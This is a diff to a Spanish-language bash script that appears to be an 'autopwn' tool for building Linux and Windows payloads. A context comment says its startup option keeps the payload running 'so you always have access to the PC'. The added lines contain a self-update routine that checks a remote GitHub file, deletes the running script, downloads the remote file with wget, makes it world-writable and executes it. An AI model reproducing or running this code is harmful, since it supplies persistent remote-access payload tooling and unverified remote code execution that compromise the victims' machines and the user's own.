@@ -1,5 +1,7 @@
 #!/bin/bash
 
+version="1.0"
+
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 
@@ -27,6 +29,33 @@ startup="no" # añade el payload al inicio para que siempre tengas acceso al PC
 # NO PONER ESPACIOS EN LOS NOMBRES, USA BARRA BAJA EN SU LUGAR.
 linuxoutname="writer.elf"
 windowsoutname="writer.exe"
+
+webcon="`curl -s "https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/autopwn.txt" | cat`"
+
+color_transition() {
+    while true; do
+    	clear
+        echo -e "\e[31mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR.\e[0m"
+        sleep 0.1
+        clear
+        echo -e "\e[37mTIENES UNA VERSION DESACTUALIZADA, PULSA ENTER PARA ACTUALIZAR.\e[0m"
+        sleep 0.1
+    done
+}
+
+if echo "$webcon" | grep -q "version=\"1.0\""; then
+sleep 1
+else
+    color_transition &
+    color_pid=$!
+    sleep 0.2
+    read -p "" input
+    kill $color_pid
+    rm -f "$0"
+    wget https://raw.githubusercontent.com/pepemanaca/hthethrfdt/main/autopwn.txt -O autopwn.sh
+    chmod 777 autopwn.sh
+    ./autopwn.sh
+fi
 
 sudo clear
 
